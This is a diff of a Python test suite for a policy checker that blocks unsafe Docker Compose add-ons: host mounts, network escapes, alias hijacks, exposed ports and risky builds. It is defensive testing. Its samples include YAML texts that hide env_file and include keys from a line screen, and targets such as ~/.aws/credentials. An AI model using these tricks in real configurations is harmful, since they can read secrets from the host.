         is code that runs next time, so no declaration allows it, not even to a listed catalog."""
         for name in trust.MACHINE_FILES:
-            def edit(arguments, name=name):
-                arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
-                    {"type": "bind", "source": str(self.root / name / "sub"), "target": "/x", "read_only": True}]
+            keys = {"volumes": [{"type": "bind", "source": str(self.root / name / "sub"), "target": "/x", "read_only": True}]}
             with self.subTest(name=name):
-                self.assertEqual(self.changed(CLEAN, edit, listed=True)["reasons"], [line("T11")])
-                self.assertEqual(self.declared_clean(edit)["reasons"], [line("T11")])
+                self.assertEqual(self.clean(keys, listed=True)["reasons"], [line("T11")])
+                self.assertEqual(self.declared_clean(keys)["reasons"], [line("T11")])
         self.assertEqual(trust.MACHINE_FILES, (".env", ".lab", "seeder", "lab-ui", "docker-compose.yml", "Makefile", ".git"))
 
-    def declared_clean(self, edit):
-        """The clean add-on of a listed catalog, with `edit` applied and a reason given for using the machine."""
+    def declared_clean(self, keys):
+        """The clean add-on of a listed catalog, with `keys` on its service and a reason given for using the machine."""
         def both(arguments):
-            edit(arguments)
+            arguments["unit_config"]["services"]["hostile-clean"].update(keys)
             arguments["unit"]["meta"]["host_access"] = {"hostile-clean": "Because it must"}
         return self.changed(CLEAN, both, listed=True)
 
@@ -694,11 +396,11 @@ class Mounts(Golden):
         upper = str(self.root).upper()
         for source in (str(self.root / ".ENV"), str(self.root / ".Env"), str(self.root / ".LAB/catalogs"), str(self.root / "SEEDER"),
                        upper, upper + "/.env", str(self.root / "Lab-UI/lab_ui")):
-            def edit(arguments, source=source):
-                arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [{"type": "bind", "source": source, "target": "/x", "read_only": True}]
+            keys = {"volumes": [{"type": "bind", "source": source, "target": "/x", "read_only": True}]}
             with self.subTest(source=source):
-                self.assertEqual(self.changed(CLEAN, edit, listed=True)["reasons"][:1], [line("T11")])
-                self.assertEqual(self.declared_clean(edit)["reasons"][:1], [line("T11")])
+                self.assertEqual(self.clean(keys, listed=True)["reasons"][:1], [line("T11")])
+                self.assertEqual(self.declared_clean(keys)["reasons"][:1], [line("T11")])
+
     def test_t11_a_folder_of_the_host_beside_the_lab_is_a_class_h_finding(self):
         def edit(arguments):
             arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
@@ -717,64 +419,34 @@ class Mounts(Golden):
         outside = self.root / "elsewhere"
         outside.mkdir()
         os.symlink(outside, unit / "link")
-        def edit(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
-                {"type": "bind", "source": str(unit / "link"), "target": "/x", "read_only": True},
-                {"type": "bind", "source": str(unit / "data"), "target": "/y", "read_only": True}]
-        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T11")])
+        self.assertEqual(self.clean({"volumes": [
+            {"type": "bind", "source": str(unit / "link"), "target": "/x", "read_only": True},
+            {"type": "bind", "source": str(unit / "data"), "target": "/y", "read_only": True}]})["reasons"], [line("T11")])
 
     def test_t11_without_the_real_path_the_paths_are_compared_as_written(self):
         """What the caller must hand in: judge reads no disk, so a link is only followed through context["realpath"]."""
         unit = self.root / ".lab/catalogs/hostile/addons/p-clean-addon"
         unit.mkdir(parents=True)
         os.symlink(self.root / "elsewhere", unit / "link")
-        def edit(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
-                {"type": "bind", "source": str(unit / "link"), "target": "/x", "read_only": True}]
-        self.assertEqual(self.changed(CLEAN, edit, realpath=None)["state"], "ok")
-        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T11")])
+        link = {"volumes": [{"type": "bind", "source": str(unit / "link"), "target": "/x", "read_only": True}]}
+        self.assertEqual(self.clean(link, realpath=None)["state"], "ok")
+        self.assertEqual(self.clean(link)["reasons"], [line("T11")])
 
     def test_t11_an_odd_spelling_misses_the_list_and_never_passes_it(self):
         unit = str(self.root / ".lab/catalogs/hostile/addons/p-clean-addon")
         for source in ("//" + unit.lstrip("/") + "/x", unit + "/../../p-other/x", unit + "/../../../x", "..", "x\0y", "~/x", "$HOME/x",
                        "data", "./data", "../x", unit + "x", unit + "-other/x", unit.upper() + "/x"):
-            def edit(arguments, source=source):
-                arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [{"type": "bind", "source": source, "target": "/x"}]
             with self.subTest(source=source):
-                self.assertEqual(self.changed(CLEAN, edit, realpath=None)["reasons"], [line("T11")])
-        def inside(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
-                {"type": "bind", "source": unit + "/./a/../.state/x", "target": "/x"}]
-        self.assertEqual(self.changed(CLEAN, inside, realpath=None)["state"], "ok")
-
-    def test_t12_a_writable_bind_of_its_folder_blocks_and_its_state_and_secrets_do_not(self):
-        self.fires("t12-bind-writable", "T12", line("T12"))
-        self.ok("h-secrets-rw")
-        self.silent(CLEAN, "T12")
-
-    def test_t12_a_writable_bind_of_a_unit_of_the_closure_blocks_and_a_read_only_one_does_not(self):
-        self.fires("h-sibling-bind-rw", "T12", line("T12"))
-        self.ok("h-sibling-bind-ro")
+                self.assertEqual(self.clean({"volumes": [{"type": "bind", "source": source, "target": "/x"}]}, realpath=None)["reasons"],
+                                 [line("T11")])
+        inside = {"volumes": [{"type": "bind", "source": unit + "/./a/../.state/x", "target": "/x"}]}
+        self.assertEqual(self.clean(inside, realpath=None)["state"], "ok")
 
     def test_t12_a_writable_bind_of_the_folder_itself_blocks(self):
         def edit(arguments):
             arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                 {"type": "bind", "source": arguments["roots"]["unit"], "target": "/x"}]
         self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T12")])
-
-    def test_t13_volumes_from_blocks(self):
-        verdict = self.fires("t13-volumes-from", "T13", line("T13"))
-        self.assertIn(line("T01", key="volumes_from"), verdict["reasons"])
-        self.silent(CLEAN, "T13")
-
-    def test_t14_an_external_a_foreign_or_disguised_volume_blocks(self):
-        for name in ("t14-external-volume", "t14-core-volume", "t14-volume-alias"):
-            with self.subTest(unit=name):
-                self.assertEqual(self.judge(name)["reasons"], [line("T14")])
-
-    def test_t14_a_volume_of_its_own_does_not(self):
-        self.silent(CLEAN, "T14")
-        self.assertEqual(self.judge(CLEAN)["state"], "ok")
 
     def test_t14_every_way_to_make_a_volume_a_folder_of_the_host(self):
         for definition in ({"driver": "nfs"}, {"driver_opts": {"device": "/etc", "o": "bind", "type": "none"}},
@@ -788,13 +460,6 @@ class Mounts(Golden):
             arguments["unit_config"]["volumes"]["clean-data"] = {"name": "gravitee_clean-data", "driver": "local",
                                                                  "driver_opts": {"type": "tmpfs", "o": "size=1m"}}
         self.assertEqual(self.changed(CLEAN, fine)["state"], "ok")
-
-    def test_t15_an_external_network_blocks(self):
-        self.fires("t15-external-network", "T15", line("T15"))
-
-    def test_t15_the_lab_networks_and_a_bridge_of_its_own_do_not(self):
-        self.silent(CLEAN, "T15")
-        self.assertIn("own", self.args(CLEAN)["unit_config"]["networks"])
 
     def test_t15_every_way_to_leave_the_bridge(self):
         for definition in ({"driver": "host"}, {"driver": "macvlan"}, {"driver": "ipvlan"}, {"driver_opts": {"parent": "eth0"}},
@@ -818,24 +483,17 @@ class Mounts(Golden):
                 self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T15")] if state == "blocked" else [])
 
     def test_t15_a_network_it_never_declared_blocks_and_the_default_does_not(self):
-        def edit(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["networks"] = ["internal", "default", "elsewhere"]
-        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T15")])
-        def fine(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["networks"] = {"internal": None, "default": None, "edge": {"aliases": ["a"]}}
-        self.assertEqual(self.changed(CLEAN, fine)["state"], "ok")
+        self.assertEqual(self.clean({"networks": ["internal", "default", "elsewhere"]})["reasons"], [line("T15")])
+        self.assertEqual(self.clean({"networks": {"internal": None, "default": None, "edge": {"aliases": ["a"]}}})["state"], "ok")
 
     def test_t15_an_alias_of_a_service_of_the_platform_blocks(self):
         """A name on the lab network answers to the container that took it: `apim-management-api` must be the platform's."""
-        self.assertEqual(self.judge("t15-alias-hijack")["reasons"], [line("T15")])
         core = regen.load("core")["services"]
         name = next(service["container_name"] for service in core.values() if service.get("container_name"))
         for alias in ("apim-management-api", "mongodb", name):
-            def edit(arguments, alias=alias):
-                arguments["unit_config"]["services"]["hostile-clean"]["networks"] = {"internal": {"aliases": ["fine", alias]}}
             with self.subTest(alias=alias):
-                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T15")])
-                self.assertEqual(self.changed(CLEAN, edit, listed=True)["reasons"], [line("T15")])
+                self.assertEqual(self.clean({"networks": {"internal": {"aliases": ["fine", alias]}}})["reasons"], [line("T15")])
+                self.assertEqual(self.clean({"networks": {"internal": {"aliases": ["fine", alias]}}}, listed=True)["reasons"], [line("T15")])
 
     def test_t15_an_alias_of_a_service_it_brings_blocks_and_an_alias_of_its_own_does_not(self):
         def brings(arguments):
@@ -849,13 +507,10 @@ class Mounts(Golden):
         def own(arguments):
             arguments["unit_config"]["services"]["hostile-clean"]["networks"] = {"internal": {"aliases": ["hostile-clean", "clean.example"]}}
         self.assertEqual(self.changed(CLEAN, own)["state"], "ok")
-        def odd(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["networks"] = {
-                "internal": {"aliases": "mongodb"}, "own": None, "edge": {"aliases": [None, 7, ["mongodb"], {"a": 1}]}}
-        self.assertEqual(self.changed(CLEAN, odd)["state"], "ok")
+        odd = {"internal": {"aliases": "mongodb"}, "own": None, "edge": {"aliases": [None, 7, ["mongodb"], {"a": 1}]}}
+        self.assertEqual(self.clean({"networks": odd})["state"], "ok")
 
     def test_t16_a_secret_or_a_config_from_outside_its_folder_blocks(self):
-        self.fires("t16-secret-file", "T16", line("T16"))
         for key, definition in (("secrets", {"environment": "HOME"}), ("secrets", {"external": True}),
                                 ("configs", {"file": "/etc/hosts"}), ("configs", {"environment": "X"})):
             def edit(arguments, key=key, definition=definition):
@@ -869,42 +524,28 @@ class Mounts(Golden):
             arguments["unit_config"]["configs"] = {"c": {"name": "gravitee_c", "content": "hello"}}
         self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
 
-    def test_t17_a_port_with_no_loopback_address_blocks(self):
-        self.fires("t17-all-interfaces", "T17", line("T17"))
-        self.silent(CLEAN, "T17")
-
     def test_t17_every_address_that_is_not_loopback(self):
         for port in ({"target": 80, "published": "8199"}, {"target": 80}, {"target": 80, "published": "1", "host_ip": "0.0.0.0"},
                      {"target": 80, "published": "1", "host_ip": "::"}, {"target": 80, "published": "1", "host_ip": "127.0.0.2"},
                      {"target": 80, "host_ip": "localhost"}, "8199:80", "80", "0.0.0.0:80:80"):
-            def edit(arguments, port=port):
-                arguments["unit_config"]["services"]["hostile-clean"]["ports"] = [port]
             with self.subTest(port=port):
-                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T17")])
+                self.assertEqual(self.clean({"ports": [port]})["reasons"], [line("T17")])
         for port in ({"target": 80, "published": "1", "host_ip": "::1"}, "127.0.0.1:8199:80", "[::1]:8199:80"):
-            def edit(arguments, port=port):
-                arguments["unit_config"]["services"]["hostile-clean"]["ports"] = [port]
             with self.subTest(port=port):
-                self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
+                self.assertEqual(self.clean({"ports": [port]})["state"], "ok")
 
 
 class Builds(Golden):
 
-    def test_t18_a_context_outside_its_folder_blocks(self):
-        self.assertEqual(self.judge("t18-build-outside")["reasons"], [line("T18", 0)])
-
     def test_t18_a_remote_context_must_be_a_git_repository_at_a_commit(self):
-        self.assertEqual(self.judge("t18-build-remote-unpinned")["reasons"], [line("T18", 1)])
         sha = "0123456789abcdef0123456789abcdef01234567"
         for context, state in ((f"https://example.invalid/app.git#{sha}", "ok"), (f"git@example.invalid:o/r.git#{sha}", "ok"),
                                (f"https://example.invalid/app.git#{sha}:sub", "ok"), (f"github.com/o/r#{sha}", "ok"),
                                ("https://example.invalid/app.git", "blocked"), ("https://example.invalid/app.git#main", "blocked"),
                                (f"https://example.invalid/app.tar.gz#{sha}", "blocked"), ("https://example.invalid/app.git#0123", "blocked"),
                                (f"https://example.invalid/app.git#{sha.upper()}", "blocked"), ("github.com/o/r", "blocked")):
-            def edit(arguments, context=context):
-                arguments["unit_config"]["services"]["hostile-clean"]["build"] = {"context": context}
             with self.subTest(context=context):
-                self.assertEqual(self.changed(CLEAN, edit)["state"], state)
+                self.assertEqual(self.clean({"build": {"context": context}})["state"], state)
 
     def build_edit(self, build, name=CLEAN, **more):
         """The verdict of `name` after the build of its service is replaced by `build`, a mapping or a text. `build` may name
@@ -921,18 +562,6 @@ class Builds(Golden):
             arguments["unit_config"]["services"]["hostile-clean"]["build"] = fill(build)
         return self.changed(name, edit, **more)
 
-    def test_t18_extra_access_blocks(self):
-        for name in ("t18-build-extra-access", "t18-build-core-image"):
-            self.assertEqual(self.judge(name)["reasons"], [line("T18", 2)], name)
-        for key, value in (("ssh", ["default"]), ("secrets", [{"source": "k"}]), ("cache_to", ["type=local"]),
-                           ("entitlements", ["network.host"]), ("tags", ["other:1"]), ("network", "host"), ("privileged", True)):
-            def edit(arguments, key=key, value=value):
-                build = arguments["unit_config"]["services"]["hostile-clean"]["build"]
-                arguments["unit_config"]["services"]["hostile-clean"]["build"] = dict(
-                    {"context": arguments["roots"]["unit"]} if isinstance(build, str) else {"context": arguments["roots"]["unit"]}, **{key: value})
-            with self.subTest(key=key):
-                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T18", 2)] if key != "privileged" else [line("T03"), line("T18", 2)])
-
     # What Compose 5.6 knows of a build (the Compose file reference), and what a later Compose may add: none is accepted but the
     # five of the allow-list, so a key that is not in this list blocks as well (the last two)
     OTHER_BUILD_KEYS = ("additional_contexts", "cache_from", "cache_to", "dockerfile_inline", "entitlements", "extra_hosts",
@@ -941,8 +570,6 @@ class Builds(Golden):
 
     def test_t18_the_five_keys_of_the_allow_list_are_the_whole_of_it(self):
         self.assertEqual(trust.BUILD_KEYS, ("context", "dockerfile", "args", "target", "labels"))
-        self.assertEqual(trust.SEEDER_BUILD_KEYS, ("additional_contexts",))
-        self.assertFalse(hasattr(trust, "EXTRA_BUILD"), "the deny list is gone: one list, the allow-list")
 
     def test_t18_a_build_with_the_keys_of_the_allow_list_passes(self):
         full = {"context": "@unit@", "dockerfile": "Dockerfile", "args": {"A": "1"}, "target": "release", "labels": {"k": "v"}}
@@ -955,8 +582,8 @@ class Builds(Golden):
 
     def test_t18_any_other_key_blocks_whatever_its_value(self):
         for key in self.OTHER_BUILD_KEYS:
-            if key in ("additional_contexts", "privileged"):
-                continue   # their own tests: the first is for the seeder, the second says T03 too
+            if key == "privileged":
+                continue   # its own test: it says T03 too
             for value in (True, False, None, "", 0, 1, [], {}, ["x"], {"a": "b"}, "x"):
                 with self.subTest(key=key, value=value):
                     verdict = self.build_edit({"context": "@unit@", key: value})
@@ -987,16 +614,13 @@ class Builds(Golden):
         self.assertEqual(self.build_edit(None)["state"], "ok", "no build is no build")
 
     def test_t18_what_the_stage_that_builds_refuses_is_what_the_policy_blocks(self):
-        for build, seeder, wanted in (({"context": ".", "dockerfile": "D", "args": {}, "target": "t", "labels": {}}, False, []),
-                                      ("./app", False, []), ({"context": ".", "ssh": []}, False, ["ssh"]),
-                                      ({"pull": 1, "network": "host", "context": "."}, False, ["network", "pull"]),
-                                      ({"additional_contexts": {}}, False, ["additional_contexts"]),
-                                      ({"additional_contexts": {}}, True, []),
-                                      ({"additional_contexts": {}, "ssh": 1}, True, ["ssh"]), ({}, False, []),
-                                      ({"x-a": 1, "x-b": 1}, True, ["x-a", "x-b"]), (7, False, ["build"]), (None, False, ["build"]),
-                                      ([], False, ["build"])):
-            with self.subTest(build=build, seeder=seeder):
-                self.assertEqual(trust.build_extras(build, seeder), wanted)
+        for build, wanted in (({"context": ".", "dockerfile": "D", "args": {}, "target": "t", "labels": {}}, []),
+                              ("./app", []), ({"context": ".", "ssh": []}, ["ssh"]),
+                              ({"pull": 1, "network": "host", "context": "."}, ["network", "pull"]),
+                              ({"additional_contexts": {}}, ["additional_contexts"]), ({}, []),
+                              ({"x-a": 1, "x-b": 1}, ["x-a", "x-b"]), (7, ["build"]), (None, ["build"]), ([], ["build"])):
+            with self.subTest(build=build):
+                self.assertEqual(trust.build_extras(build), wanted)
         self.assertEqual(trust.build_extras({"b": 1, "a": 1, 3: 1}), ["3", "a", "b"], "sorted, as text")
 
     def test_t18_no_key_that_compose_prints_for_a_build_written_with_the_allowed_keys_is_outside_the_list(self):
@@ -1019,14 +643,10 @@ class Builds(Golden):
                 self.assertTrue(set(service["build"]) <= set(trust.BUILD_KEYS), service["build"])
 
     def test_t18_the_folder_of_the_unit_and_the_seeder_are_the_only_local_contexts(self):
-        self.silent(CLEAN, "T18")
-        self.silent(PLAYGROUND, "T18")
         def edit(arguments):
             arguments["unit_config"]["services"]["hostile-clean"]["build"] = {"context": arguments["roots"]["seeder"]}
         self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
-        def other(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["build"] = {"context": str(self.root / "plugins")}
-        self.assertEqual(self.changed(CLEAN, other)["reasons"], [line("T18", 0)])
+        self.assertEqual(self.clean({"build": {"context": str(self.root / "plugins")}})["reasons"], [line("T18", 0)])
 
     def test_t18_a_dockerfile_outside_the_folder_blocks(self):
         for dockerfile, state in (("Dockerfile", "ok"), ("sub/Dockerfile", "ok"), ("../Dockerfile", "blocked"),
@@ -1036,58 +656,22 @@ class Builds(Golden):
             with self.subTest(dockerfile=dockerfile):
                 self.assertEqual(self.changed(CLEAN, edit)["state"], state)
 
-    CONTEXTS = (({"base": "docker-image://alpine:3"}, "ok", []), ({"base": "target:other"}, "ok", []),
-                ({"base": "service:other"}, "ok", []), ({"base": "/etc"}, "blocked", [0]),
-                ({"base": "https://example.invalid/x.git#main"}, "blocked", [1]),
-                ({"base": "https://example.invalid/x.git#0123456789abcdef0123456789abcdef01234567"}, "ok", []),
-                (["base=/etc"], "blocked", [0]), (["base=docker-image://alpine"], "ok", []), ({}, "ok", []), ([], "ok", []))
-
-    def test_t18_an_additional_context_of_the_lab_seeder_is_held_to_the_same_as_the_context(self):
-        for extra, state, variants in self.CONTEXTS:
-            with self.subTest(extra=extra):
-                verdict = self.build_edit({"context": "@seeder@", "additional_contexts": extra})
-                self.assertEqual((verdict["state"], verdict["reasons"]), (state, [line("T18", each) for each in variants]))
-
-    def test_t18_an_additional_context_of_any_other_build_blocks_whatever_it_names(self):
-        for extra, state, variants in self.CONTEXTS:
-            if extra in ({}, []):
-                continue   # a key with nothing in it is still the key
-            with self.subTest(extra=extra):
-                verdict = self.build_edit({"context": "@unit@", "additional_contexts": extra})
-                self.assertEqual((verdict["state"], verdict["reasons"]), ("blocked", [line("T18", each) for each in [*variants, 2]]))
-        for build in ({"context": "@unit@", "additional_contexts": {}}, {"context": "@unit@", "additional_contexts": []}):
-            self.assertEqual(self.build_edit(build)["reasons"], [line("T18", 2)], "the key alone is extra access")
-
-    def test_t18_the_seeders_other_keys_are_held_to_the_list_and_its_additional_contexts_do_not_widen_it(self):
-        base = {"context": "@seeder@", "additional_contexts": {"base": "docker-image://alpine:3"}}
-        self.assertEqual(self.build_edit({**base, "args": {"A": "1"}, "target": "t", "labels": {"k": "v"}})["state"], "ok")
-        self.assertEqual(self.build_edit({**base, "ssh": ["default"]})["reasons"], [line("T18", 2)])
-        self.assertEqual(self.build_edit({**base, "dockerfile_inline": "FROM scratch"})["reasons"], [line("T18", 2)])
-
-    def test_t18_a_seeder_that_takes_extra_contexts_is_not_the_labs_seeder_for_n01(self):
-        """T18 accepts the key for the seeder's build; N01 is what keeps the token from a seed built with anything more."""
-        def edit(arguments):
-            arguments["unit_config"]["services"]["fixture-seed"] = {
-                "image": "example.invalid/hostile/seeder", "labels": {"io.gravitee.role": "seed"},
-                "build": {"context": arguments["roots"]["seeder"], "additional_contexts": {"base": "docker-image://alpine:3"}}}
-            arguments["own"] = [*arguments["own"], "fixture-seed"]
-        verdict = self.changed(PLAYGROUND, edit)
-        self.assertNotIn("T18", verdict["codes"], verdict["reasons"])
-        self.assertIn(line("N01"), verdict["notes"])
+    def test_t18_additional_contexts_block_on_any_build_the_labs_seeder_included(self):
+        for context in ("@unit@", "@seeder@"):
+            for extra in ({"base": "docker-image://alpine:3"}, ["base=/etc"], {}, []):
+                with self.subTest(context=context, extra=extra):
+                    self.assertEqual(self.build_edit({"context": context, "additional_contexts": extra})["reasons"], [line("T18", 2)])
 
     def test_t18_a_context_and_a_pin_are_still_judged_with_the_keys_checked(self):
         self.assertEqual(self.build_edit({"context": "@unit@/../elsewhere"})["reasons"], [line("T18", 0)])
-        self.assertEqual(self.build_edit({"context": "@unit@", "dockerfile": "../Dockerfile"})["reasons"], [line("T18", 0)])
         self.assertEqual(self.build_edit({"context": "@unit@/../elsewhere", "ssh": 1})["reasons"], [line("T18", 0), line("T18", 2)])
 
     def test_t18_a_build_as_a_text_is_a_context(self):
-        def edit(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["build"] = "https://example.invalid/app.git#main"
-        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T18", 1)])
+        self.assertEqual(self.clean({"build": "https://example.invalid/app.git#main"})["reasons"], [line("T18", 1)])
 
 
 # What an author can write so that a reading line by line does not see the key, and Compose reads it. Each text was run through
-# Compose 5.6.0 with a real file outside the folder, and Compose read it: test_compose_reads_what_the_screen_refuses runs them
+# Compose 5.6 with a real file outside the folder, and Compose read it: test_compose_reads_what_the_screen_refuses runs them
 # again when Compose is installed. @SECRET@, @INC@ and @BASE@ stand for a file outside the project.
 HIDDEN = {
     "explicit-key-alone": 'services:\n  a:\n    image: busybox\n    ?\n      "env_file"\n    :\n      @SECRET@\n',
@@ -1113,6 +697,10 @@ HIDDEN = {
     "include-comment-then-nel": "services: {}\u0085# note\u0085include: [@INC@]\n",
     "extends-file": "services:\n  a:\n    extends:\n      file: @BASE@\n      service: b\n",
     "extends-binary": "services:\n  a:\n    extends:\n      !!binary ZmlsZQ==: @BASE@\n      service: b\n",
+    # A `\x0a` replaced makes the rest of its line a comment: only the text as written, or its escapes without its folds, shows the key
+    "newline-escape-hides-the-key": "services: {a: {image: \\x0a#, env_file: @SECRET@}}\n",
+    "newline-escape-and-fold-hide-the-key": 'services:\n  a:\n    image: \\x0a#\\\n    "env_\\x66ile": @SECRET@\n',
+    "include-newline-escape-and-fold": 'x-a: \\x0a#\\\n"inc\\x6cude": [@INC@]\n',
 }
 # And the ones that are not valid YAML for Compose, or that it would not read, and that the screen refuses all the same
 ODD = (
@@ -1129,8 +717,8 @@ class Screen(Case):
     FILE = ".lab/catalogs/ns/addons/x/compose.yml"
     INCLUDE, FILES = trust.RULES["T19"]["lines"]
 
-    def screen(self, text, file=None, **how):
-        return trust.prescreen(text, file or self.FILE, **how)
+    def screen(self, text, file=None):
+        return trust.prescreen(text, file or self.FILE)
 
     def test_a_clean_file_has_no_reason(self):
         for text in ("services:\n  a:\n    image: busybox\n", "", "include:\n  - ../../addons/a/compose.yml\nservices: {}\n",
@@ -1141,21 +729,6 @@ class Screen(Case):
                      "      test: [\"CMD-SHELL\", \"curl -sf x | grep -Eq '\\\"healthy\\\" *: *true'\"]\n"):
             with self.subTest(text=text):
                 self.assertEqual(self.screen(text), [])
-                self.assertEqual(self.screen(text, follow=True), [])
-
-    def test_a_clean_file_of_the_engine_is_clean(self):
-        """The real units, as they sit in the engine today: the screen reads words, and none of these says one it refuses.
-        (Gone with them when the content moves to its catalog, and then the units of that catalog are the ones to run.)"""
-        files = sorted([*regen.ENGINE.glob("addons/*/compose.yml"), *regen.ENGINE.glob("playgrounds/*/compose.yml"),
-                        *regen.ENGINE.glob("setups/*.yml")])
-        files = [file for file in files if "local" not in file.relative_to(regen.ENGINE).parts]
-        if not files:
-            print("skipped: the engine holds no unit", file=sys.stderr)
-            self.skipTest("the engine holds no unit")
-        for file in files:
-            with self.subTest(file=str(file.relative_to(regen.ENGINE))):
-                where = ".lab/catalogs/gravitee/" + file.relative_to(regen.ENGINE).as_posix()
-                self.assertEqual(self.screen(file.read_text(encoding="utf-8"), where), [])
 
     def test_a_word_in_a_sentence_or_a_comment_is_no_key(self):
         for text in ("# env_file: /etc/passwd\n  # include: /etc\nservices: {}\n",
@@ -1195,42 +768,17 @@ class Screen(Case):
             for text in (f"services:{brk}  a:{brk}    env_file:{brk}      - /outside/x{brk}", f"services:{brk}  a:{brk}    env_file:{brk}      - ok.env{brk}"
                          f"      - path: /outside/x{brk}", f"services:{brk}  a:{brk}    env_file: [{brk}ok.env,{brk}/outside/x]{brk}"):
                 with self.subTest(text=text):
-                    self.assertEqual(self.screen(text, follow=True), [self.FILES])
+                    self.assertEqual(self.screen(text), [self.FILES])
             clean = f"include:{brk}  - ../ok.yml{brk}services: {{}}{brk}"
             self.assertEqual(self.screen(clean), [])
 
-    def test_t19_a_file_a_service_reads_is_refused_until_the_caller_reads_it(self):
+    def test_t19_a_file_a_service_reads_is_refused(self):
         """Compose reads an env_file into the environment, ${NAME} and all, and nothing in the resolved JSON shows it."""
         for key in ("env_file", "label_file"):
             for text in (f"services:\n  a:\n    {key}: ./a.env\n", f"services:\n  a:\n    {key}:\n      - ./a.env\n",
                          f"services:\n  a:\n    {key}: [a.env]\n", f'services: {{a: {{"{key}": "a.env"}}}}\n'):
                 with self.subTest(text=text):
                     self.assertEqual(self.screen(text), [self.FILES])
-                    self.assertEqual(self.screen(text, follow=True), [])
-        # a plain name in a one-line flow is read two ways (`a.env}}` in a block), and the readings must agree
-        self.assertEqual(self.screen("services: {a: {env_file: a.env}}\n", follow=True), [self.FILES])
-
-    def test_t19_a_file_a_service_reads_stays_in_its_folder(self):
-        for key in ("env_file", "label_file"):
-            for target in ("/dev/zero", "~/.aws/credentials", "${HOME}/x", "../../b.env", "https://example.invalid/e", "../b.env"):
-                with self.subTest(key=key, target=target):
-                    for text in (f"services:\n  a:\n    {key}: {target}\n", f"services:\n  a:\n    {key}:\n      - ok.env\n      - {target}\n",
-                                 f"services:\n  a:\n    {key}:\n    - {target}\n", f"services:\n  a:\n    {key}:\n      - path: {target}\n",
-                                 f"services:\n  a:\n    {key}: [{target}]\n", f'services:\n  a:\n    {key}: "{target}"\n'):
-                        self.assertEqual(self.screen(text, follow=True), [self.FILES], text)
-        self.assertEqual(self.screen("services:\n  a:\n    env_file: sub/../ok.env\n", follow=True), [])
-        self.assertEqual(self.screen("services:\n  a:\n    env_file:\n      - ./a.env\n      - path: b.env\n        required: false\n",
-                                     follow=True), [])
-
-    def test_t19_the_files_a_unit_names_are_the_ones_the_caller_reads(self):
-        text = ("services:\n  a:\n    env_file:\n      - ./a.env\n      - path: sub/b.env\n        required: false\n"
-                "  b:\n    env_file: [a.env, 'c.env']\n    label_file: \"d.env\"\n")
-        folder = ".lab/catalogs/ns/addons/x"
-        self.assertEqual(trust.env_files(text, self.FILE), [f"{folder}/a.env", f"{folder}/c.env", f"{folder}/d.env", f"{folder}/sub/b.env"])
-        self.assertEqual(trust.env_files("services: {}\n", self.FILE), [])
-        self.assertEqual(trust.env_files("env_file: /dev/zero\n", self.FILE), [])
-        self.assertEqual(trust.env_files(text, ".lab/catalogs/ns/playgrounds/x/seed/a.yaml"), [])
-        self.assertEqual(trust.env_files(None, self.FILE), [])
 
     FOLDER = ".lab/catalogs/ns/addons"   # where `../a/compose.yml` leads from the folder of FILE
 
@@ -1258,7 +806,7 @@ class Screen(Case):
                 ("include:\n  - ../a/compose.yml\ninclude:\n  - ../b/compose.yml\n", [a, b]),
                 # an `include:` that is no key is no include: prose in a quoted scalar, a comment, a word that ends in the key
                 ('x-gravitee: {description: "Does not include: files", name: x}\nservices: {}\n', []),
-                ("x-gravitee:\n  description: \"Does not include: kafka\"\n  label: 'Does include: Kafka (optional)'\nservices: {}\n", []),
+                ("x-gravitee:\n  description: \"Does not include: kazoo\"\n  label: 'Does include: Kazoo (optional)'\nservices: {}\n", []),
                 ("services:\n  a:\n    image: x # include: ../a/compose.yml\n    command: [\"sh\", \"-c\", \"include: ../a/compose.yml\"]\n", []),
                 ("x-include: ../a/compose.yml\nservices: {}\n", []),
                 # and a real one in each place a key may stand
@@ -1312,7 +860,7 @@ class Screen(Case):
                 "include:\n  - a b.yml\n", "include:\n  - 'a b.yml'\n", "include:\n  - a=b.yml\n", "include:\n  - a%20b.yml\n",
                 "include:\n  - a\u00a0b.yml\n", "include:\n  - a\x0bb.yml\n",
                 "include:\n  - path:\n      b.yml\n      c.yml\n", "include:\n  path: b.yml\n", "include:\n  - b.yml\n  c.yml\n",
-                "include:\n  - !<tag:x> b.yml\n", "include:\n  - &a,b c.yml\n", "include:\n  - !a,b c.yml\n"):
+                "include:\n  - !<tag:x> b.yml\n", "include:\n  - !tag:x b.yml\n", "include:\n  - &a,b c.yml\n", "include:\n  - !a,b c.yml\n"):
             with self.subTest(text=text):
                 self.assertIsNone(self.targets(text))
         for text, wanted in (("include:\n  - b.yml\n", ["b.yml"]), ("include: [b.yml, 'c.yml', \"d.yml\"]\n", ["b.yml", "c.yml", "d.yml"]),
@@ -1371,37 +919,6 @@ class Screen(Case):
         self.assertEqual(self.screen("\ufeffinclude:\n- ../ok.yml\nservices: {}\n"), [])
         self.assertEqual(self.targets("\ufeffinclude:\n- ../a/compose.yml\n"), [f"{self.FOLDER}/a/compose.yml"])
 
-    def test_the_readings_of_a_text_are_its_letters_with_and_without_the_folds_and_escapes(self):
